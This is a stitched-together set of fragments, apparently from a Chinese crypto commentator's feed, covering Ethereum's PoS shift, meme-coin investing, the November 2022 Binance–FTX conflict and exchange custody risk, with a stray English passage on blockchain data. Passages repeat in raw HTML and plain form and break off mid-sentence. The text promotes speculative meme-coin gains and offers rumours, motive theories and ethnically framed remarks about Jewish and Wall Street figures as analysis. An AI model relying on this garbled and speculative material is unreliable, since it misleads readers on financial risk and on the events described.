Those that don’t, get outpaced by companies and products that do. It’s no different in the blockchain industry.\nBut while much of the critical data, like transactions, wallets, and prices, is transparent, it’s hardly meaningful to most people. The strings of numbers and letters on the blockchain need to be indexed to make sense, and dozens of platforms exist to help the general public understand what’s going on in web3.\nBut where do these platforms get their data from?\nWhat about enterprises and organizations that need highly particular data for their internal use, like VCs and GameFi projects?\nUntil recently, most developers would build out their SDKs for data ETL, a strategy that is pricey and difficult to maintain.

数量。\n另外，目前以太坊社区尤其是大矿工群体，对于PoW合并为PoS一直存在争议。\n以太坊2.0升级涉及到的最大的利益分割问题，源于共识机制的转变，也就是PoW向PoS的转变，意味着大量的以太坊矿工将要下岗。这牵涉到相当体量的矿机硬件、矿池、矿工等加密群体利益。\n对于争议，Vitalik的观点很明确：升级PoS是为了提高以太坊的安全性和效率。\n在Crypto世界和区块链中，核心的理念就三条：去中心化、隐私、安全。也就是一直提到的“不可能三角””无法解决，即安全性、效率和去中心化。目前情况下，这三方面是无法兼得的（市面上项目有说能够同时很好兼顾这三个方面的，你就要注意了，八成是假的）。而PoW到PoS的转变就是在这三个方面做出了不同的取舍。\nPoW以无许可和算力门槛保证了整个系统的安全性和去中心化程度，但在效率方面则不可避免的会有缺失，实际上其也确实长期被延迟高、低吞吐量（高GAS手续费、拥堵）等问题所困扰。\n而PoS则选择了另一条路，它不再POW无许可，取而代之，矿工成为了生态系统的实际参与人。这意味着如果矿工做出了不利于整个系统的决策，作恶者也会付出代价。但其POS投票机制也降低了整个系统的安全性，同时，POS矿工和资本的身份合一也让系统出现了中心化的风险，少数巨头大户把持网络。这也正是目前被广泛诟病的。以太坊一直信奉的去中心化，有可能变成相对的多中心化。\n但矛盾统一，事物都有相对性。世界上也没有绝对的去中心化和中心化。面对Crypto的“不可能三角”以及社会运转中所呈现的繁复活动，以太坊也不能独自承担起整个世界。\n所以未来的Crypto世界，一定是多链的世界。会根据不同的应用需求而出现对“去中心化、隐私、安全”不同侧重的需求。\n货币体系和经济体系需要的一定是安全性、去中心化以及部分隐私，而诸如社交、游戏这些高频活动对性能的需求又会大过对安全性的需求。那么公链格局就会变成以太坊+诸多特性公链+跨链，各司其职，联合运转。\n以太坊也因为是目前技术最成熟、积累最深厚的智能合约底层，逐步从ICO的平台变成了DeFi的金融结算层，同时又获得了部分BTC所具备的货币结算价值。而以太坊升级后带来可能相对集中的变化，也并没有改变它往“去中心化”方向实现的逻辑基本面。而是：\n以太坊2这些举措，无一例外的会让以太坊获得很多的开发者，更低的准入门槛，更高的用户容量。同时，建立在区块链底层“去中心化”为核心原教旨的原则，也不会变。\n而打开以太坊局限的2.0升级，就意味着以太坊在向着世界级金融结算层、以及Web3、元宇宙等应用的底层构架迈进了关键一步。康波认为，未来十年以太坊会和比特币依然会作为加密龙头从各自角度，首先迈进10万亿市值的体量。所以，康波最后留给你去思考的问题是，请尝试粗略计算届时比特币和以太坊的价格会达到多少？\nIf

除了见证价值投资BTC、ETH等主流币种可以获得20、30倍的不错收益，你可能还有见证到短时间100倍、1000倍，甚至上万倍巨大涨幅的meme类币种，并且常常因为错过这些以小博大，快速致富的机会，而懊悔不以，不知道正在收听节目的你有没有这种体会，坦白说康波经历了，而很多机会没有抓住，或碰巧抓住很小的一部分红利，回想起来总有拍断腿的冲动。不过，再好的机会如果没有能够把握住，即时介入，以及及时变现，都是一场空，而且机会往往稍纵即逝，白白错过财富机会。\n所以，作为加密货币的投资者或者叫适度投机者，总结复盘，提高认知，才能够在未来的牛市中把握住财富机会，俗话说：机会是属于有准备的人的！而现在的熊市正是又一次给广大普通加密投资者准备的公平机会。\n因此，康波觉得痛定思痛，有必要复盘一下，加密领域不可忽视的财富机会板块，meme类币种的投资规律。以期机会来临时，不会再次因为错过，而后悔不已。世界上有很多种药，就是没有后悔药。\n目前，meme币概念也已成为加密货币领域最受关注的投资机会之一，在上轮牛市中DOGE（狗狗币）单从2021年1月份到2021年5月份上涨100倍，而SHIB（柴犬币）单从2021年2月—2021年10月就上涨了8800倍。当前，DOGE、SHIB均属于加密货币市值排行前20币种，即使当前相比牛市最高点币价已经跌去了90%左右，依然都市值几百亿元，说明还是有很大的共识存在。\n根据有关机构统计，meme币赛道约有当前有200-300个项目，整体市值约160亿美元左右。而正常的meme项目在牛市通常平均会有5-20倍的收益回报。\n接下来，总结meme的几大特征要素：\n1、    社区共识炒作\nMeme主要就是加密社区全网注意力，例如DOGE的名人效应马斯克喊单；SHIB蹭到V神影响力等，当然还有模仿蹭DOGE、SHIB概念的，或其他一些奇思妙想的营销构思的meme币种。社区病毒式传播会促使meme币的成功，但因受名人影响的极大不确定，波动性依然意味着高风险。因此跟踪meme币社区参与度，并衡量市场情绪情况，能帮助预测未来的价格走势。例如，谷歌趋势（<a

除了见证价值投资BTC、ETH等主流币种可以获得20、30倍的不错收益，你可能还有见证到短时间100倍、1000倍，甚至上万倍巨大涨幅的meme类币种，并且常常因为错过这些以小博大，快速致富的机会，而懊悔不以，不知道正在收听节目的你有没有这种体会，坦白说康波经历了，而很多机会没有抓住，或碰巧抓住很小的一部分红利，回想起来总有拍断腿的冲动。不过，再好的机会如果没有能够把握住，即时介入，以及及时变现，都是一场空，而且机会往往稍纵即逝，白白错过财富机会。\n所以，作为加密货币的投资者或者叫适度投机者，总结复盘，提高认知，才能够在未来的牛市中把握住财富机会，俗话说：机会是属于有准备的人的！而现在的熊市正是又一次给广大普通加密投资者准备的公平机会。\n因此，康波觉得痛定思痛，有必要复盘一下，加密领域不可忽视的财富机会板块，meme类币种的投资规律。以期机会来临时，不会再次因为错过，而后悔不已。世界上有很多种药，就是没有后悔药。\n目前，meme币概念也已成为加密货币领域最受关注的投资机会之一，在上轮牛市中DOGE（狗狗币）单从2021年1月份到2021年5月份上涨100倍，而SHIB（柴犬币）单从2021年2月—2021年10月就上涨了8800倍。当前，DOGE、SHIB均属于加密货币市值排行前20币种，即使当前相比牛市最高点币价已经跌去了90%左右，依然都市值几百亿元，说明还是有很大的共识存在。\n根据有关机构统计，meme币赛道约有当前有200-300个项目，整体市值约160亿美元左右。而正常的meme项目在牛市通常平均会有5-20倍的收益回报。\n接下来，总结meme的几大特征要素：\n1、    社区共识炒作\nMeme主要就是加密社区全网注意力，例如DOGE的名人效应马斯克喊单；SHIB蹭到V神影响力等，当然还有模仿蹭DOGE、SHIB概念的，或其他一些奇思妙想的营销构思的meme币种。社区病毒式传播会促使meme币的成功，但因受名人影响的极大不确定，波动性依然意味着高风险。因此跟踪meme币社区参与度，并衡量市场情绪情况，能帮助预测未来的价格走势。例如，谷歌趋势（http://trends.google.com）通常是衡量包括加密市场在内的众多市场对某个主题的兴趣度常用方式之一，而Twitter则有助于衡量市场参与者情况及了解meme项目最新进展。\n2、初始市值较小：\n市值过大不容易在FOMO的情绪下暴涨，而且有大资金砸盘的风险。在炒作之前，无论是DOGE、SHIB、PEOPLE，还是其他曾经的明星meme市值开始都很小，甚至大资金开始并不屑于参与。价格极低，普通参与者也只需极少资金尝试，或许就能带来极大收益，例如康波在2018年价格低的时候也曾买了几千元的DOGE，如果不是没拿住在2020年底上涨前给卖成了U，也能在几个月后变成大几十万；SHIB的价格起始于小数点后很多个零，康波是在2021年4月买入，涨了20多倍就匆匆变现，后在市场情绪的驱动下，继续大幅上涨，一直到市值进入到前十，几千亿元的市值。正是因为，市值小，当群体,包括大资金FOMO进场后，出现了惊人的涨幅。\n3、 叙事性强：\nmeme币需要有较能快速形成共识或情绪的故事性，才有可能吸引大量早期的加密玩家参与，并转化为拥护者、宣传者。其实目前加密领域大部分叙事文化都是创新的（或者叫现编的），能否落地谁也不知道，只要逻辑性较强就有可能可以。例如DOGE的小费打赏文化；SHIB的建设大众公链生态；PEOPLE的群体联合购买美国宪法原始版本等各种奇特创新。\n4、交易所上币驱动：\n这也是很重要的一个推动力，交易所在运营过程中，很重要的一个思路就是，不断的有财富效应，和不断的制造有话题热度的币种，以此来吸引流量用户，甚至抢夺同行的流量。这样才能一直保持平台的竞争力，吸引来更多的用户，塑造更好的口碑，获取更多的收益。并且meme币容易快速形成暴富效应，也是吸引大量新增流量到达币圈的第一站。因此交易所也乐于助推meme情绪炒作形成合力。例如SHIB持续暴涨就源于Huobi、OKX、Binance、Coinbase的陆续上币效应。\n另外，通常meme的轮动周期往往在牛市的中后段，周期规律大概率是：主流币→热门板块→新概念→meme币→熊市。如果对应上一轮牛市周期，那对应的投资规律是：

11 Nov 2022 09:46:54 GMT","content:encoded":"<p>最近虽然加密市场依然处在熊市，但跟加密相关的热点话题是不断出现，先是马斯克收购推特，相关加密货币DOGE，以及定位web3社交基础设施的MASK受到追捧而大涨，然后是始终在币圈活跃的波场创始人孙宇晨被爆幕后收购李林的火币股份，背后执掌火币交易平台，前几天又被爆出知名链游代币GALA被黑客攻击期间，火币内部人为没及时关闭充提，致使GALA币价在火币平台短时被人套利砸穿。</p>\n<p>而这两天加密圈最大的热点可能就是Binance的赵长鹏（CZ）和FTX的SBF,其情节跌宕起伏堪比小说，也牵动着整个加密市场。从11月6日晚些时候开始，当前全球头部的两大加密交易所创始人， Binance的赵长鹏（CZ）和FTX的SBF之间的矛盾突然升级，公开在全球最大的社交平台推特上各自的账户开始公开的对峙，推文内容火药味十足，并且都是真刀真枪的专揭对方痛处。昨日，更是是开始互砸手里的筹码了，FTX系的FTT、SOL等币价断崖式下跌，并持续跌破关键价位。受此次事件影响，本处于反弹行情的BTC、ETH等龙头，也被带崩，跌破关键价位，进入下跌趋势。同时，有业内KOL检测到FTX正在往Binance频繁充值BNB，估计是为了应对挤兑筹集资金护盘，同时FTX在各个平台的资金也在流会FTX，但还是无济于事，挤兑已在所难免，其结果是FTX一度停止提现，被爆已没有资金可提。北京时间昨天晚间，更是魔幻，昨晚早些时候又有新的谣言传出，说FTX的资金缺口高达60亿美元。这引发了包括BTC、ETH在内的整个加密资产的再次大跌。随后北京时间晚间12:03 SBF发了一条推特表示，FTX将接受Binance的投资，CZ紧跟也在其推特账号同步发声将全资收购FTX,BTC、ETH带领下，整个加密市场在随后直线大幅拉盘，BNB更是短时直接冲到398刀，FTT也一度回到21.33刀，大饼从19300冲回20500美金，整个大盘重新复活，合约空军受到重创，然而，晚间12:30 盘面又突然开始急转急下，大盘疯狂下跌，BTC直接跌破了今年6月份LUNA、三箭崩盘时的最低价17588美金，达到了年内新低17200美金。FTX的平台币更是短时从19美金跌到最低3美金，下跌幅度85%。据传是SEC（美国证券交易委员会）正在开始关注Binance与FTX这起收购案，这可能触发老美的反垄断法案，而无法顺利完成收购。另外，可能还有一个原因：就是确定收购意向后，Binance发现FTX的窟窿也许太大，而变卦了。</p>\n<p>这与今年特斯拉创始人马斯克收购推特如出一辙的。马斯克有在推特收购案上出尔反尔先例，甚至假意收购救援，实则关键时候缩手，这样不被“反垄断”限制的同时，还能使竞争对手消失，一石二鸟。另外，cz和马斯克在收购推特上有资金合作；且同时俩人在美国总统中期选举都支持共和党与SBF支持拜登民主党不同，借用马斯克的话就是，共和党获胜更有利于企业和经济振兴。而大众投资者也普遍认为，共和党执政对股市有利。</p>\n<h1 id=\"接下来，我们来回顾一下此次事件的前因后果。11月3日有关媒体披露的ftx财务状况文件，无疑成为目前币安、ftx「隔空对战」的导火线。该评论认为目前ftx交易平台挪用用户数字资产，使用杠杆交易，存在巨大债务风险。binancecz赵长鹏单方面宣布，为避免出现类似luna崩盘的资产风险，将出售账面上所有ftt。随后，二级市场交易用户跟随对ftt转为看空态度，普遍抱着为保障资产安全，宁可信其有的心态，纷纷从ftx交易平台转出加密资产。再至多个链上数据显示ftx正于不同渠道调取资金注入平台金库，这次连传统银行机构也害怕的挤兑行为，已经在ftx发生，至此围绕在两大cex巨头之间的火药味渐浓。\">接下来，我们来回顾一下此次事件的前因后果。11月3日有关媒体披露的FTX财务状况文件，无疑成为目前币安、FTX「隔空对战」的导火线。该评论认为目前FTX交易平台挪用用户数字资产，使用杠杆交易，存在巨大债务风险。BinanceCZ赵长鹏单方面宣布，为避免出现类似LUNA崩盘的资产风险，将出售账面上所有FTT。随后，二级市场交易用户跟随对FTT转为看空态度，普遍抱着为保障资产安全，宁可信其有的心态，纷纷从FTX交易平台转出加密资产。再至多个链上数据显示FTX正于不同渠道调取资金注入平台金库，这次连传统银行机构也害怕的挤兑行为，已经在FTX发生，至此围绕在两大CEX巨头之间的火药味渐浓。</h1>\n<p>其实，此次两大加密交易平台事件积怨已久。康波认为最近的一则报道可能更是激化了矛盾，近日，据路透社报道，尽管美国制裁旨在切断伊朗与全球金融体系的联系，但自 2018 年以来，加密交易所Binance已经处理了价值 80 亿美元的伊朗交易。自 2018 年以来，总计约 29.5 亿美元的加密货币直接在伊朗交易所和币安之间转移。Binance立即发公告澄清，表示将彻查相关账户。当看到这则消息的时候，给康波的感觉是，有背后的利益相关，想借用政治敏感，这是把Binance往死里整。平时我们经常看新闻应该也知道，美国政府对一些国家的经济封锁和制裁是非常严格的。如果被冠上帮助转移资产的罪名，被美国政府盯上，Binance再大的体量，也毕竟是一家公司，被收拾也是非常容易的。</p>\n<p>另外，近几年华尔街和硅谷的资本势力在加密基础设施（底层公链），矿业，生态应用，交易平台等全面渗透，当然也有国内原因，本来在加密各领域领先的华人节节败退，守住的最后一片江湖就是几大交易市场的庞大交易量。</p>\n<p>目前，华人和华尔街资本在Cex对抗勉强能做到二分天下，两军对垒的旗帜人物就是CZ vs SBF。</p>\n<p>当然这背后有同行的竞争，有资本利益的角逐，也有个人的恩怨。</p>\n<p>首先，我们来介绍一下，FTX交易平台及创办人SBF(全名Sam Bankman-Fried，因一头卷发人称“爆炸头”) ，SBF应该说是币圈无人不知、无人不晓的人物。他刚刚30岁就因坐拥170亿美元总资产登上了福布斯排行榜，有币友将他和以太坊创始人Vitalik，币安创始人赵长鹏CZ，波场创始人孙宇晨（Justin Sun）合称为币圈“四大天王”。在创办FTX交易所之前，SBF在华尔街的量化交易公司简恩资本（Jane

Binance的赵长鹏（CZ）和FTX的SBF之间的矛盾突然升级，公开在全球最大的社交平台推特上各自的账户开始公开的对峙，推文内容火药味十足，并且都是真刀真枪的专揭对方痛处。昨日，更是是开始互砸手里的筹码了，FTX系的FTT、SOL等币价断崖式下跌，并持续跌破关键价位。受此次事件影响，本处于反弹行情的BTC、ETH等龙头，也被带崩，跌破关键价位，进入下跌趋势。同时，有业内KOL检测到FTX正在往Binance频繁充值BNB，估计是为了应对挤兑筹集资金护盘，同时FTX在各个平台的资金也在流会FTX，但还是无济于事，挤兑已在所难免，其结果是FTX一度停止提现，被爆已没有资金可提。北京时间昨天晚间，更是魔幻，昨晚早些时候又有新的谣言传出，说FTX的资金缺口高达60亿美元。这引发了包括BTC、ETH在内的整个加密资产的再次大跌。随后北京时间晚间12:03 SBF发了一条推特表示，FTX将接受Binance的投资，CZ紧跟也在其推特账号同步发声将全资收购FTX,BTC、ETH带领下，整个加密市场在随后直线大幅拉盘，BNB更是短时直接冲到398刀，FTT也一度回到21.33刀，大饼从19300冲回20500美金，整个大盘重新复活，合约空军受到重创，然而，晚间12:30 盘面又突然开始急转急下，大盘疯狂下跌，BTC直接跌破了今年6月份LUNA、三箭崩盘时的最低价17588美金，达到了年内新低17200美金。FTX的平台币更是短时从19美金跌到最低3美金，下跌幅度85%。据传是SEC（美国证券交易委员会）正在开始关注Binance与FTX这起收购案，这可能触发老美的反垄断法案，而无法顺利完成收购。另外，可能还有一个原因：就是确定收购意向后，Binance发现FTX的窟窿也许太大，而变卦了。\n这与今年特斯拉创始人马斯克收购推特如出一辙的。马斯克有在推特收购案上出尔反尔先例，甚至假意收购救援，实则关键时候缩手，这样不被“反垄断”限制的同时，还能使竞争对手消失，一石二鸟。另外，cz和马斯克在收购推特上有资金合作；且同时俩人在美国总统中期选举都支持共和党与SBF支持拜登民主党不同，借用马斯克的话就是，共和党获胜更有利于企业和经济振兴。而大众投资者也普遍认为，共和党执政对股市有利。\n接下来，我们来回顾一下此次事件的前因后果。11月3日有关媒体披露的FTX财务状况文件，无疑成为目前币安、FTX「隔空对战」的导火线。该评论认为目前FTX交易平台挪用用户数字资产，使用杠杆交易，存在巨大债务风险。BinanceCZ赵长鹏单方面宣布，为避免出现类似LUNA崩盘的资产风险，将出售账面上所有FTT。随后，二级市场交易用户跟随对FTT转为看空态度，普遍抱着为保障资产安全，宁可信其有的心态，纷纷从FTX交易平台转出加密资产。再至多个链上数据显示FTX正于不同渠道调取资金注入平台金库，这次连传统银行机构也害怕的挤兑行为，已经在FTX发生，至此围绕在两大CEX巨头之间的火药味渐浓。\n其实，此次两大加密交易平台事件积怨已久。康波认为最近的一则报道可能更是激化了矛盾，近日，据路透社报道，尽管美国制裁旨在切断伊朗与全球金融体系的联系，但自 2018 年以来，加密交易所Binance已经处理了价值 80 亿美元的伊朗交易。自 2018 年以来，总计约 29.5 亿美元的加密货币直接在伊朗交易所和币安之间转移。Binance立即发公告澄清，表示将彻查相关账户。当看到这则消息的时候，给康波的感觉是，有背后的利益相关，想借用政治敏感，这是把Binance往死里整。平时我们经常看新闻应该也知道，美国政府对一些国家的经济封锁和制裁是非常严格的。如果被冠上帮助转移资产的罪名，被美国政府盯上，Binance再大的体量，也毕竟是一家公司，被收拾也是非常容易的。\n另外，近几年华尔街和硅谷的资本势力在加密基础设施（底层公链），矿业，生态应用，交易平台等全面渗透，当然也有国内原因，本来在加密各领域领先的华人节节败退，守住的最后一片江湖就是几大交易市场的庞大交易量。\n目前，华人和华尔街资本在Cex对抗勉强能做到二分天下，两军对垒的旗帜人物就是CZ vs SBF。\n当然这背后有同行的竞争，有资本利益的角逐，也有个人的恩怨。\n首先，我们来介绍一下，FTX交易平台及创办人SBF(全名Sam Bankman-Fried，因一头卷发人称“爆炸头”) ，SBF应该说是币圈无人不知、无人不晓的人物。他刚刚30岁就因坐拥170亿美元总资产登上了福布斯排行榜，有币友将他和以太坊创始人Vitalik，币安创始人赵长鹏CZ，波场创始人孙宇晨（Justin Sun）合称为币圈“四大天王”。在创办FTX交易所之前，SBF在华尔街的量化交易公司简恩资本（Jane Street）工作的一名交易员，是美籍的犹太后裔。\n2017年比特币在6个月内从2500美元暴涨至近2万美元，25岁的SBF察觉了机会，毅然辞去华尔街的高薪工作，创办加密量化交易公司Alameda Research，开始币圈逐利的生活。\n对于进入数字货币市场的理由，SBF也直言不讳：他进入加密币领域时，对加密币是什么一无所知。他只是感觉那里有很多很好的交易机会。\n在接受媒体采访时，SBF表示自己的第一桶金来自美日市场的比特币套利，在巅峰时通过套利每天可进帐多达2500万美元。在资本不断积累后，SBF于2019年5月成立了FTX。\n然后，对于Binance和赵长鹏可能国内加密参与者都不陌生，简单介绍就是：2017年牛市期间作为前OK交易平台技术负责人，卖掉上海的房产，创立了Binance，与擅长营销的何一搭档，受9.4国内清退潮影响，出海并迅速发展起来。然后，最近业内流传的另外一个与今天两虎相争可能相关的萌芽埋下了，那就是在创立Binance之处赵长鹏并不像今天这么顺风顺水和意气风发，据一个深圳后来的业内早期参与者朋友讲：当时，创立Binance之处非常艰难，赵长鹏资金、资源都不是很好，当时的几个交易平台也都做了几年了，赵长鹏做交易平台，大家都不看好，包括身边的一些有交集的圈内朋友，一度Binance缺乏资金，面临倒闭，赵长鹏到处赵朋友借钱，然后拿低价BNB的份额作为交换。据说，一度找到知名的红杉资本，可想而知，红杉资本名气多大，也是没看上赵的Binance。谁曾想2018年、2019年Binance凭借用户至上，不断提升服务，迅速带来大量国内新增流量，市值上涨了几十，上百倍，这是红杉又来找到赵长鹏，要求按照原先商议的份额和价格参与进来，可想而知，赵心里大概是“日落西山你不配，东山再起你是谁”。就此，Binance与资源、资本雄厚的红杉结怨，红杉退而求其次，找到并投资了当时的华尔街犹太裔交易员出身的FTX交易平台和创办人SBF。同时，通过各种关系不断爆Binance负面消息。\n\n接下来，我们再来了解下FTX与Binance之间的爱恨情仇。\n在获得市场份额后，FTX需要进一步获得其在加密货币市场中的合规性，为此需要一步步扩大其政治影响力。\n根据媒体报道，在最近的美国总统中期选举中，SBF花费了近4000万美元支持民主党，已成为两党的最大捐赠者之一。SBF在2021-2022年周期总共贡献了3980万美元，是第六大政治贡献者。在2020年的总统选举中，SBF在拜登总统的竞选活动捐赠了约520万美元。SBF曾在采访中称，他计划花费高达10亿美元来帮助2024年的总统竞选活动。当前，币安虽有FTX十倍的用户及利润，但FTX在美国的政治影响力远高于币安十倍以上。\n在2019年，发展起来的赵长鹏已经意识到了这个问题，Binance可以顺利运用FTX的政治影响力和在美国加密货币市场的合规性，及SBF的华尔街犹太裔交易员身份，获得华尔街的支持，促进Binance在美国币圈发展，发生冲突对于两者都没有好处。\n2019年12月20日，FTX启动还不到半年，币安就宣布对FTX进行10亿美金的战略投资。币安表示，除了对FTX的股权投资以外，还将长期持有FTT，帮助FTX生态的持续发展，使其保持与币安生态的发展并驾齐驱。其实，当时看到这则消息康波是没有看懂的，是理解不了一家交易平台投资另外一家野心勃勃快速发展的竞争对手，当时康波的想法是，可能最终两家能够合并，但是现在看来两家完全是水火不容，本身平台基因都不同。\n在币安投资的一年后，SBF透露，FTX最新的估值已经达到35亿美元，仅仅1年半，估值就从1亿美元涨到35亿美元。\n时间到了2021年7月，FTX以180亿美元完成了9亿美元B轮融资，FTX成立约2年估值从1亿美元涨到180亿美元。而CZ也在那时表示，币安已从FTX的股权投资中完全退出，获得了起初投资十倍的收益，其中很大一部分是以FTX平台币FTT兑现。这时其实FTX与Binance已经出现裂痕，中间也有红杉的影子。\n尽管2021年7月前后这段时间，币安与FTX没有产生直接冲突，但双方业务早已高度重合，并直接产生竞争。此后便进入到了摩擦时期。\n有分析指出，币安与FTX的摩擦是多方面的因素造成的，从一方面来看，双方对现货、衍生品等核心业务的市场占有率的冲突，另一方面在生态布局上又存在着竞争，但更重要的冲突则来源于二者战略与文化的竞争。\n另外，对于此次FTX与Binance两大加密交易平台的博弈，有圈内参与者认为，有可能象当年国内加多宝和王来吉大战，最后两家都没事，结果把一众做凉茶的小品牌干没了。康波，不知道这次会带来什么后果，但是估计以两家的体量，最后都不会有太大问题，只是短时间对市场会有一定冲击，甚至本月加密市场行情在11月10日美国CPI公布出现短暂波动后，可能会再度出现反弹行情。\n目前，康波认为后续时态发展及币价走势还不好判断，存在很大变数，币价继续下跌的风险也很大，主要看事件恶化程度，甚至此时CZ也不是没有担心，事件继续恶化，会打击投资者信心，以致牵连整个加密市场各个交易平台出现挤兑，其实已经有业内资深参与者在建议为保障资产安全，把大额个人资产提到冷钱包存储。今天康波也注意到包括Binance、火币、gate在内的交易平台，在积极承诺平台的资金安全保障，给用户以信心。\n最后，康波建议鸡蛋最好不要放在一个篮子，大资金的话最好也还是放在冷钱包为妥，小资金可以分散在头部几个交易平台也没关系，或者放在链上钱包也问题不大。另外，有兴趣的朋友也可以持续关注，一起见证当前的两家交易所大战对加密市场后续价格走势的影响。\n \n\nIf

7000-13000 BTC的提现金额。</p>\n<p>从提现困难到崩盘跑路，中心化交易所往往让客户状告无门。挪用客户资产这一核心问题的产生也有其背后成因：</p>\n<p>● 内部权限过大：自行业初创至今，中心化交易所便是集各项金融职能于一身的综合型机构，在提供场内交易撮合主业的同时，也全权保管了客户充值的代币资产。</p>\n<p>● 资产保管不透明：集中归集管理是中心化交易所保存客户代币资产的一贯模式，客户经链上划转充值后，资产便由交易所转至其少数的内部钱包地址进行统一管理，客户无法进一步追踪和查询属于自己的代币资产。</p>\n<p>● 收益放大冲动：盈利诉求及内部KPI压力，导致交易所内部有足够冲动利用客户资产再投资以获取更多回报，本质上放大了自营的投资杠杆，客户则在并不知情下承受了更高风险。</p>\n<p>● 不受外部约束：除了内部层面，当前市场及监管尚未形成对中心化交易所足够的外部约束，更加规范安全的交易模式仍未形成，指望已存严重路径依赖的中心化交易所完全自律来改变并不现实。</p>\n<p>一直以来颇具讽刺的是，具有去中心化特性的加密技术，却带来严重的中心化问题。中心化交易所在加密行业承担的职能十分集中，因此扮演的角色过于重要。它不仅是撮合匹配订单信息的交易所，也担任了银行及经纪商的角色。参考金融历史，这样兼具裁判员与运动员的一类机构，所藏风险往往是惊人的。</p>\n<p>中心化交易在很长时期内仍将是用户交易加密资产的首选方式。这是基于其友好的场内下单模式、即时迅捷的交易执行效率、丰富灵活的衍生交易工具及大体量的交易深度。然而，此次FTX事件的发生必会引发行业如何构建或升级充分安全的中心化交易环境的思考。显然，在加密市场，中心化交易所们的自我约束力严重缺乏，真正的合规化仍需较长时间，而监管的规范化落实也往往要以数年为单位。</p>\n<p>另外，此次事件最近也助推了两个类别的币价：一个是钱包类，一个是DeFi。作为加密技术的重要板块，去中心化金融 DeFi是否能解决这些问题？</p>\n<p>DeFi 的核心原则之一是信任最小化，你无需相信我正在做的事情。因为数据链上可查，你可以随时检查，任何人都可以参与审查。</p>\n<p>那么 DeFi 中是否存在风险？是的当然，风险无处不在。传统金融试图通过监管来解决信任问题，而有些时候监管本身就有问题。而 DeFi 则是通过数据公开可查，从而提高透明度来解决问题。</p>\n<p>银行挤兑和扣留资产在中心化金融中并不是什么新鲜事，当事情进展顺利并且每个人都开心时，我们往往会忘记这一点。然后当事情进展不顺利，人们无法使用他们的资金时，就会出现挤兑。</p>\n<p>这就是 DeFi 可以提供，而中心化金融无法提供的另一个优势：完全控制自己的资产。</p>\n<p>在 DeFi 中，用户不会将代币的永久保管权交给第三方，第三方也可以拒绝访问以用户的名字命名的钱包，用户自己来控制自己的钱包。</p>\n<p>用户可能会将代币发布到执行交易或其他协议的智能合约中，但去中心化智能合约的好处是无需相信有人会干预它。用户不必依赖一个人的承诺，智能合约自行执行，无需任何干预。如果你想要拿回你的代币，随时可以拿回来。所有这些都是公开的，一切都可以验证和追溯。这就是目前构建 DeFi 协议的原因，权力下放最终对消费者来说是更安全的，而且这样做会提供更好运作的金融市场。</p>\n<p>只是目前DeFi还非常早期，技术漏洞问题，逻辑自洽问题，人为干预问题，还需要不断迭代完善，但可以肯定的是，DeFi会是未来金融市场解决一直以来人为作恶和信任问题的最优解。</p>\n<p>从Luna、三箭，到FTX事件，可能还不是结尾，依然有雷没有爆，这几天有媒体爆料，比较受关注的危机事件，还有如：市场传言称知名加密交易平台和借贷机构 Genesis 或存在偿付能力问题，为了填补窟窿，Genesis 的母公司 DCG  或选择解散旗下另一家公司 Grayscale（灰度 ）所发行的 GBTC 和 ETHE。另外，还有一些小的交易平台资不抵债的传闻。</p>\n<p>所以，在高回报高风险的加密市场，作为普通加密参与者，通过这次事件，我们已经清晰的看到头部加密资产巨头也会在很短的事件轰然倒塌，给市场参与者带来巨大损失。</p>\n<h2

BTC的提现金额。\n从提现困难到崩盘跑路，中心化交易所往往让客户状告无门。挪用客户资产这一核心问题的产生也有其背后成因：\n● 内部权限过大：自行业初创至今，中心化交易所便是集各项金融职能于一身的综合型机构，在提供场内交易撮合主业的同时，也全权保管了客户充值的代币资产。\n● 资产保管不透明：集中归集管理是中心化交易所保存客户代币资产的一贯模式，客户经链上划转充值后，资产便由交易所转至其少数的内部钱包地址进行统一管理，客户无法进一步追踪和查询属于自己的代币资产。\n● 收益放大冲动：盈利诉求及内部KPI压力，导致交易所内部有足够冲动利用客户资产再投资以获取更多回报，本质上放大了自营的投资杠杆，客户则在并不知情下承受了更高风险。\n● 不受外部约束：除了内部层面，当前市场及监管尚未形成对中心化交易所足够的外部约束，更加规范安全的交易模式仍未形成，指望已存严重路径依赖的中心化交易所完全自律来改变并不现实。\n一直以来颇具讽刺的是，具有去中心化特性的加密技术，却带来严重的中心化问题。中心化交易所在加密行业承担的职能十分集中，因此扮演的角色过于重要。它不仅是撮合匹配订单信息的交易所，也担任了银行及经纪商的角色。参考金融历史，这样兼具裁判员与运动员的一类机构，所藏风险往往是惊人的。\n中心化交易在很长时期内仍将是用户交易加密资产的首选方式。这是基于其友好的场内下单模式、即时迅捷的交易执行效率、丰富灵活的衍生交易工具及大体量的交易深度。然而，此次FTX事件的发生必会引发行业如何构建或升级充分安全的中心化交易环境的思考。显然，在加密市场，中心化交易所们的自我约束力严重缺乏，真正的合规化仍需较长时间，而监管的规范化落实也往往要以数年为单位。\n另外，此次事件最近也助推了两个类别的币价：一个是钱包类，一个是DeFi。作为加密技术的重要板块，去中心化金融 DeFi是否能解决这些问题？\nDeFi 的核心原则之一是信任最小化，你无需相信我正在做的事情。因为数据链上可查，你可以随时检查，任何人都可以参与审查。\n那么 DeFi 中是否存在风险？是的当然，风险无处不在。传统金融试图通过监管来解决信任问题，而有些时候监管本身就有问题。而 DeFi 则是通过数据公开可查，从而提高透明度来解决问题。\n银行挤兑和扣留资产在中心化金融中并不是什么新鲜事，当事情进展顺利并且每个人都开心时，我们往往会忘记这一点。然后当事情进展不顺利，人们无法使用他们的资金时，就会出现挤兑。\n这就是 DeFi 可以提供，而中心化金融无法提供的另一个优势：完全控制自己的资产。\n在 DeFi 中，用户不会将代币的永久保管权交给第三方，第三方也可以拒绝访问以用户的名字命名的钱包，用户自己来控制自己的钱包。\n用户可能会将代币发布到执行交易或其他协议的智能合约中，但去中心化智能合约的好处是无需相信有人会干预它。用户不必依赖一个人的承诺，智能合约自行执行，无需任何干预。如果你想要拿回你的代币，随时可以拿回来。所有这些都是公开的，一切都可以验证和追溯。这就是目前构建 DeFi 协议的原因，权力下放最终对消费者来说是更安全的，而且这样做会提供更好运作的金融市场。\n只是目前DeFi还非常早期，技术漏洞问题，逻辑自洽问题，人为干预问题，还需要不断迭代完善，但可以肯定的是，DeFi会是未来金融市场解决一直以来人为作恶和信任问题的最优解。\n从Luna、三箭，到FTX事件，可能还不是结尾，依然有雷没有爆，这几天有媒体爆料，比较受关注的危机事件，还有如：市场传言称知名加密交易平台和借贷机构 Genesis 或存在偿付能力问题，为了填补窟窿，Genesis 的母公司 DCG  或选择解散旗下另一家公司 